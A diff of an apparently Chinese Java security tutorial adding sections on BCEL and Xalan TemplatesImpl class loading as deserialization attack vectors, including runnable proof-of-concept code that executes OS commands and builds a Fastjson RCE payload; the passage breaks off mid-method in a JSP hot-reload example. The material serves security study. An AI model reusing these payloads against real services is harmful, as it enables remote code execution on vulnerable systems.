@@ -273,7 +273,17 @@ pom.xml
 
 ## BCEL ClassLoader
 
-[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库。BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类Payload。
+[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类Payload。
+
+**示例 - BCEL类名解码：**
+
+<img src="../../images/image-20211021104833683.png" alt="image-20211021104833683" style="zoom:50%;" />
+
+当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL$$`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码，最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击Payload中。
+
+
+
+### BCEL编解码
 
 **BCEL编码：**
 
@@ -285,6 +295,599 @@ String className = "$$BCEL$$" + com.sun.org.apache.bcel.internal.classfile.Utili
 ```
 
 编码后的类名：`$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85S$dbn$d......`，BCEL会对类字节码进行编码，
+
+**BCEL解码：**
+
+```java
+int    index    = className.indexOf("$$BCEL$$");
+String realName = className.substring(index + 8);
+
+// BCEL解码类字节码
+byte[] bytes = com.sun.org.apache.bcel.internal.classfile.Utility.decode(realName, true);
+```
+
+如果被加载的类名中包含了`$$BCEL$$`关键字，BCEL就会使用特殊的方式进行解码并加载解码之后的类。
+
+
+
+**示例 - 使用BCEL实现命令执行：**
+
+```java
+package com.anbai.sec.classloader;
+
+import com.sun.org.apache.bcel.internal.classfile.Utility;
+
+public class BCELClassLoader {
+
+	/**
+	 * com.anbai.sec.classloader.TestBCELClass类字节码，Windows和MacOS弹计算器，Linux执行curl localhost:9999
+	 * <pre>
+	 * package com.anbai.sec.classloader;
+	 *
+	 * import java.io.IOException;
+	 *
+	 * public class TestBCELClass {
+	 *
+	 * 	static {
+	 * 		String command = "open -a Calculator.app";
+	 * 		String osName  = System.getProperty("os.name");
+	 *
+	 * 		if (osName.startsWith("Windows")) {
+	 * 			command = "calc 12345678901234567";
+	 *      } else if (osName.startsWith("Linux")) {
+	 * 			command = "curl localhost:9999/";
+	 *       }
+	 *
+	 * 		try {
+	 * 			Runtime.getRuntime().exec(command);
+	 *      } catch (IOException e) {
+	 * 			e.printStackTrace();
+	 *      }
+	 *   }
+	 * }
+	 * </pre>
+	 */
+	private static final byte[] CLASS_BYTES = new byte[]{
+			-54, -2, -70, -66, 0, 0, 0, 50, 0, 56, 10, 0, 15, 0, 26, 8, 0, 27, 8, 0, 28, 10, 0, 29, 0, 30, 8, 0, 31,
+			10, 0, 32, 0, 33, 8, 0, 34, 8, 0, 35, 8, 0, 36, 10, 0, 37, 0, 38, 10, 0, 37, 0, 39, 7, 0, 40, 10, 0, 12,
+			0, 41, 7, 0, 42, 7, 0, 43, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111,
+			100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 8, 60, 99,
+			108, 105, 110, 105, 116, 62, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 44,
+			7, 0, 40, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 84, 101, 115, 116, 66, 67,
+			69, 76, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32,
+			45, 97, 32, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110,
+			97, 109, 101, 7, 0, 45, 12, 0, 46, 0, 47, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 44, 12, 0, 48,
+			0, 49, 1, 0, 22, 99, 97, 108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55,
+			1, 0, 5, 76, 105, 110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115,
+			116, 58, 57, 57, 57, 57, 47, 7, 0, 50, 12, 0, 51, 0, 52, 12, 0, 53, 0, 54, 1, 0, 19, 106, 97, 118, 97, 47,
+			105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 55, 0, 17, 1, 0, 39, 99, 111, 109,
+			47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47,
+			84, 101, 115, 116, 66, 67, 69, 76, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110,
+			103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
+			105, 110, 103, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0,
+			11, 103, 101, 116, 80, 114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97,
+			110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83,
+			116, 114, 105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76,
+			106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
+			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117,
+			110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110,
+			116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110,
+			103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114,
+			111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101,
+			0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 2, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0,
+			5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 5, 0, 8, 0, 20, 0, 17, 0, 1, 0, 18,
+			0, 0, 0, -106, 0, 2, 0, 3, 0, 0, 0, 53, 18, 2, 75, 18, 3, -72, 0, 4, 76, 43, 18, 5, -74, 0, 6, -103, 0,
+			9, 18, 7, 75, -89, 0, 15, 43, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 75, -72, 0, 10, 42, -74, 0, 11, 87,
+			-89, 0, 8, 77, 44, -74, 0, 13, -79, 0, 1, 0, 36, 0, 44, 0, 47, 0, 12, 0, 2, 0, 19, 0, 0, 0, 46, 0, 11,
+			0, 0, 0, 8, 0, 3, 0, 9, 0, 9, 0, 11, 0, 18, 0, 12, 0, 24, 0, 13, 0, 33, 0, 14, 0, 36, 0, 18, 0, 44, 0,
+			21, 0, 47, 0, 19, 0, 48, 0, 20, 0, 52, 0, 22, 0, 21, 0, 0, 0, 19, 0, 4, -3, 0, 24, 7, 0, 22, 7, 0, 22,
+			11, 74, 7, 0, 23, -7, 0, 4, 0, 1, 0, 24, 0, 0, 0, 2, 0, 25
+	};
+
+	public static void main(String[] args) {
+		try {
+			// 使用反射是为了防止高版本JDK不存在com.sun.org.apache.bcel.internal.util.ClassLoader类
+			Class<?> bcelClass = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
+
+			// 创建BCEL类加载器
+//			ClassLoader classLoader = (ClassLoader) bcelClass.newInstance();
+//			ClassLoader classLoader = new com.sun.org.apache.bcel.internal.util.ClassLoader();
+			ClassLoader classLoader = new org.apache.bcel.util.ClassLoader();
+
+			// BCEL编码类字节码
+			String className = "$$BCEL$$" + Utility.encode(CLASS_BYTES, true);
+
+			System.out.println(className);
+
+			Class<?> clazz = Class.forName(className, true, classLoader);
+
+			System.out.println(clazz);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+}
+```
+
+上述示例程序利用了BCEL的类加载特性加载了一个恶意的类：`com.anbai.sec.classloader.TestBCELClass`，该类的static语句块中包含了命令执行，所以该类一旦被初始化就会触发命令执行。
+
+
+
+### BCEL兼容性问题
+
+BCEL这个特性仅适用于BCEL 6.0以下，因为从6.0开始`org.apache.bcel.classfile.ConstantUtf8#setBytes`就已经过时了，如下：
+
+```java
+/**
+* @param bytes the raw bytes of this Utf-8
+* @deprecated (since 6.0)
+*/
+@java.lang.Deprecated
+public final void setBytes( final String bytes ) {
+  throw new UnsupportedOperationException();
+}
+```
+
+Oracle自带的BCEL是修改了原始的包名，因此也有兼容性问题，已知支持该特性的JDK版本为：`JDK1.5 - 1.7`、`JDK8 - JDK8u241`、`JDK9`。
+
+
+
+## Xalan ClassLoader
+
+Xalan和BCEL一样都经常被用于编写反序列化Payload，Oracle JDK默认也引用了Xalan，同时修改了原包名`org.apache.xalan.xsltc.trax.TemplatesImpl`为`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，Xalan最大的特点是可以传入类字节码并初始化（需要调用`getOutputProperties`方法），从而实现RCE，比如Fastjson和Jackson会使用反射调用`getter/setter`或`成员变量映射`的方式实现JSON反序列化。
+
+`TemplatesImpl`中有一个`_bytecodes`成员变量，用于存储类字节码，通过JSON反序列化的方式可以修改该变量值，但因为该成员变量没有可映射的get/set方法所以需要修改JSON库的虚拟化配置，比如Fastjson解析时必须启用`Feature.SupportNonPublicField`、Jackson必须开启`JacksonPolymorphicDeserialization`（调用`mapper.enableDefaultTyping()`），所以利用条件相对较高。
+
+**TemplatesImpl类：**
+
+<img src="../../images/image-20211021195637540.png" alt="image-20211021195637540" style="zoom:50%;" />
+
+通过反序列化方式修改了`_bytecodes/_name/_tfactory/_outputProperties`之后还必须调用`getOutputProperties()`方法，才能触发类创建和实例化。
+
+<img src="../../images/image-20211021200026024.png" alt="image-20211021200026024" style="zoom:50%;" />
+
+**defineClass调用链：**
+
+```java
+java.lang.ClassLoader.defineClass(ClassLoader.java:794)
+java.lang.ClassLoader.defineClass(ClassLoader.java:643)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+```
+
+**getOutputProperties命令执行调用链：**
+
+```java
+java.lang.Runtime.exec(Runtime.java:347)
+com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
+sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
+sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+java.lang.reflect.Constructor.newInstance(Constructor.java:526)
+java.lang.Class.newInstance(Class.java:383)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+```
+
+**Xalan攻击示例代码：**
+
+```java
+package com.anbai.sec.classloader;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.LinkedHashMap;
+import java.util.Map;
+import java.util.Properties;
+
+import static org.apache.commons.codec.binary.Base64.encodeBase64String;
+
+public class XalanTemplatesImpl {
+
+	/**
+	 * com.anbai.sec.classloader.TestAbstractTranslet类字节码
+	 *
+	 * <pre>
+	 * package com.anbai.sec.classloader;
+	 *
+	 * import com.sun.org.apache.xalan.internal.xsltc.DOM;
+	 * import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+	 * import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+	 * import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+	 * import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+	 *
+	 * import java.io.IOException;
+	 *
+	 * public class TestAbstractTranslet extends AbstractTranslet {
+	 *
+	 * 	public TestAbstractTranslet() {
+	 * 		String command = "open -a Calculator.app";
+	 * 		String osName  = System.getProperty("os.name");
+	 *
+	 * 		if (osName.startsWith("Windows")) {
+	 * 			command = "calc 12345678901234567";
+	 *      } else if (osName.startsWith("Linux")) {
+	 * 			command = "curl localhost:9999/";
+	 *      }
+	 *
+	 * 		try {
+	 * 			Runtime.getRuntime().exec(command);
+	 *      } catch (IOException e) {
+	 * 			e.printStackTrace();
+	 *      }
+	 *    }
+	 *
+	 *    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+	 *    }
+	 *
+	 *    public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
+	 *    }
+	 * }
+	 * </pre>
+	 */
+	public static final byte[] CLASS_BYTES = new byte[]{
+			-54, -2, -70, -66, 0, 0, 0, 50, 0, 62, 10, 0, 15, 0, 31, 8, 0, 32, 8, 0, 33, 10, 0, 34, 0, 35, 8, 0,
+			36, 10, 0, 37, 0, 38, 8, 0, 39, 8, 0, 40, 8, 0, 41, 10, 0, 42, 0, 43, 10, 0, 42, 0, 44, 7, 0, 45, 10,
+			0, 12, 0, 46, 7, 0, 47, 7, 0, 48, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4,
+			67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1,
+			0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 47, 7, 0, 49, 7, 0, 45, 1, 0,
+			9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110,
+			47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101,
+			114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115,
+			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
+			101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105,
+			97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 69,
+			120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 50, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117,
+			110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116,
+			101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115,
+			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
+			101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97,
+			116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
+			101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108,
+			105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110,
+			100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25,
+			84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 46, 106,
+			97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117,
+			108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 51, 12, 0,
+			52, 0, 53, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 49, 12, 0, 54, 0, 55, 1, 0, 22, 99, 97,
+			108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105,
+			110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57,
+			57, 57, 57, 47, 7, 0, 56, 12, 0, 57, 0, 58, 12, 0, 59, 0, 60, 1, 0, 19, 106, 97, 118, 97, 47, 105,
+			111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 61, 0, 17, 1, 0, 46, 99, 111,
+			109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100,
+			101, 114, 47, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108,
+			101, 116, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
+			101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116,
+			99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110,
+			115, 108, 101, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110,
+			103, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101,
+			47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99,
+			47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106,
+			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80,
+			114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47,
+			83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
+			105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106,
+			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
+			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82,
+			117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82,
+			117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47,
+			108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110,
+			103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107,
+			84, 114, 97, 99, 101, 0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 3, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0,
+			-93, 0, 2, 0, 4, 0, 0, 0, 57, 42, -73, 0, 1, 18, 2, 76, 18, 3, -72, 0, 4, 77, 44, 18, 5, -74, 0, 6,
+			-103, 0, 9, 18, 7, 76, -89, 0, 15, 44, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 76, -72, 0, 10, 43, -74,
+			0, 11, 87, -89, 0, 8, 78, 45, -74, 0, 13, -79, 0, 1, 0, 40, 0, 48, 0, 51, 0, 12, 0, 2, 0, 19, 0, 0, 0,
+			50, 0, 12, 0, 0, 0, 13, 0, 4, 0, 14, 0, 7, 0, 15, 0, 13, 0, 17, 0, 22, 0, 18, 0, 28, 0, 19, 0, 37, 0,
+			20, 0, 40, 0, 24, 0, 48, 0, 27, 0, 51, 0, 25, 0, 52, 0, 26, 0, 56, 0, 28, 0, 20, 0, 0, 0, 24, 0, 4, -1,
+			0, 28, 0, 3, 7, 0, 21, 7, 0, 22, 7, 0, 22, 0, 0, 11, 74, 7, 0, 23, 4, 0, 1, 0, 24, 0, 25, 0, 2, 0, 18, 0,
+			0, 0, 25, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 33, 0, 26, 0, 0, 0,
+			4, 0, 1, 0, 27, 0, 1, 0, 24, 0, 28, 0, 2, 0, 18, 0, 0, 0, 25, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 1,
+			0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 38, 0, 26, 0, 0, 0, 4, 0, 1, 0, 27, 0, 1, 0, 29, 0, 0, 0, 2, 0, 30
+	};
+
+	/**
+	 * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
+	 *
+	 * @throws Exception 调用异常
+	 */
+	public static void invokeField() throws Exception {
+		TemplatesImpl template      = new TemplatesImpl();
+		Class<?>      templateClass = template.getClass();
+
+		// 获取需要修改的成员变量
+		Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
+		Field nameField             = templateClass.getDeclaredField("_name");
+		Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
+		Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");
+
+		// 修改成员属性访问权限
+		byteCodesField.setAccessible(true);
+		nameField.setAccessible(true);
+		tFactoryField.setAccessible(true);
+		outputPropertiesField.setAccessible(true);
+
+		// 设置类字节码
+		byteCodesField.set(template, new byte[][]{CLASS_BYTES});
+
+		// 设置名称
+		nameField.set(template, "");
+
+		// 设置TransformerFactoryImpl实例
+		tFactoryField.set(template, new TransformerFactoryImpl());
+
+		// 设置Properties配置
+		outputPropertiesField.set(template, new Properties());
+
+		// 触发defineClass调用链：
+		//   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
+		// 触发命令执行调用链：
+		//   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
+		template.getOutputProperties();
+	}
+
+	/**
+	 * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
+	 *
+	 * @throws Exception 调用异常
+	 */
+	public static void invokeConstructor() throws Exception {
+		// 获取TemplatesImpl构造方法
+		Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
+				byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
+		);
+
+		// 修改访问权限
+		constructor.setAccessible(true);
+
+		// 创建TemplatesImpl实例
+		TemplatesImpl template = constructor.newInstance(
+				new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
+		);
+
+		template.getOutputProperties();
+	}
+
+	/**
+	 * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
+	 */
+	public static void fastjsonRCE() {
+		// 构建恶意的JSON
+		Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
+		dataMap.put("@type", TemplatesImpl.class.getName());
+		dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
+		dataMap.put("_name", "");
+		dataMap.put("_tfactory", new Object());
+		dataMap.put("_outputProperties", new Object());
+
+		// 生成Payload
+		String json = JSON.toJSONString(dataMap);
+		System.out.println(json);
+
+		// 使用FastJson反序列化，但必须启用SupportNonPublicField特性
+		JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
+	}
+
+	public static void main(String[] args) throws Exception {
+//		invokeField();
+//		invokeConstructor();
+		  fastjsonRCE();
+	}
+
+}
+```
+
+在MacOS和Windows上执行示例程序后会弹出计算器，Linux会执行`curl localhost:9999`。
+
+
+
+## JSP类加载
+
+JSP是JavaEE中的一种常用的脚本文件，可以在JSP中调用Java代码，实际上经过编译后的jsp就是一个Servlet文件，JSP和PHP一样可以实时修改。
+
+众所周知，Java的类是不允许动态修改的（这里特指新增类方法或成员变量），之所以JSP具备热更新的能力，实际上借助的就是自定义类加载行为，当Servlet容器发现JSP文件发生了修改后就会创建一个新的类加载器来替代原类加载器，而被替代后的类加载器所加载的文件并不会立即释放，而是需要等待GC。
+
+
+
+**示例 - 模拟的JSP文件动态加载程序：**
+
+```java
+package com.anbai.sec.classloader;
+
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+
+import java.io.File;
+import java.lang.reflect.Method;
+import java.lang.reflect.Modifier;
+import java.util.HashMap;
+import java.util.Map;
+
+public class TestJSPClassLoader {
+
+	/**
+	 * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载
+	 */
+	private final Map<File, JSPClassLoader> jspClassLoaderMap = new HashMap<File, JSPClassLoader>();
+
+	/**
+	 * 创建用于测试的test.jsp类字节码，类代码如下：
+	 * <pre>
+	 * package com.anbai.sec.classloader;
+	 *
+	 * public class test_jsp {
+	 *     public void _jspService() {
+	 *         System.out.println("Hello...");
+	 *     }
+	 * }
+	 * </pre>
+	 *
+	 * @param className 类名
+	 * @param content   用于测试的输出内容，如：Hello...
+	 * @return test_java类字节码
+	 * @throws Exception 创建异常
+	 */
+	public static byte[] createTestJSPClass(String className, String content) throws Exception {
+		// 使用Javassist创建类字节码
+		ClassPool classPool = ClassPool.getDefault();
+
+		// 创建一个类，如：com.anbai.sec.classloader.test_jsp
+		CtClass ctServletClass = classPool.makeClass(className);
+
+		// 创建_jspService方法
+		CtMethod ctMethod = new CtMethod(CtClass.voidType, "_jspService", new CtClass[]{}, ctServletClass);
+		ctMethod.setModifiers(Modifier.PUBLIC);
+
+		// 写入hello方法代码
+		ctMethod.setBody("System.out.println(\"" + content + "\");");
+
+		// 将hello方法添加到类中
+		ctServletClass.addMethod(ctMethod);
+
+		// 生成类字节码
+		byte[] bytes = ctServletClass.toBytecode();
+
+		// 释放资源
+		ctServletClass.detach();
+
+		return bytes;
+	}
+
+	/**
+	 * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码
+	 *
+	 * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
+	 * @param className 类名
+	 * @param bytes     类字节码
+	 * @param parent    JSP的父类加载
+	 */
+	public JSPClassLoader getJSPFileClassLoader(File jspFile, String className, byte[] bytes, ClassLoader parent) {
+		JSPClassLoader jspClassLoader = this.jspClassLoaderMap.get(jspFile);
+
+		// 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建
+		if (jspClassLoader == null) {
+			jspClassLoader = new JSPClassLoader(parent);
+			jspClassLoader.createClass(className, bytes);
+
+			// 缓存JSP文件和所使用的类加载器
+			this.jspClassLoaderMap.put(jspFile, jspClassLoader);
+
+			return jspClassLoader;
+		}
+
+		// 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，
+		// 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，
+		// 那么需要热加载该类字节码到类加载器。
+		if (jspFile.lastModified() == 0) {
